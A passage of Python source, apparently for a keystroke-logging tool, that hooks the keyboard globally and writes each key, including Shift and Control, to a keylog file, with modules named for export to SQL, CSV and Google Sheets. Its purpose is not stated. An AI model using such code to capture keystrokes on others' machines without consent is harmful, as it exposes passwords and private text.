import ctypes
import ctypes.util
import threading
import sqlite3
import datetime
import time

from . import config
from . import keymap
from . import keylog
from . import keylog_to_sql
from . import sql_to_gsheet
from . import sql_to_csv


def cb(event):
    global handle
    global keylog_file

    if event.Key in keymap.keymap:
        key_string = keymap.keymap[event.Key]
    else:
        key_string = event.Key

    if event.Key == 'Lshift' or event.Key == 'Rshift':
        handle.StopKeyboard()
        keylog_file.write('{} '.format(key_string))
        keylog_file.flush()
        handle.StartKeyboard()
        return False
    elif event.Key == 'Lcontrol' or event.Key == 'Rcontrol':
        handle.StopKeyboard()
        keylog_file.write('{} '.format(key_string))
        keylog_file.flush()
        handle.StartKeyboard()
        return False
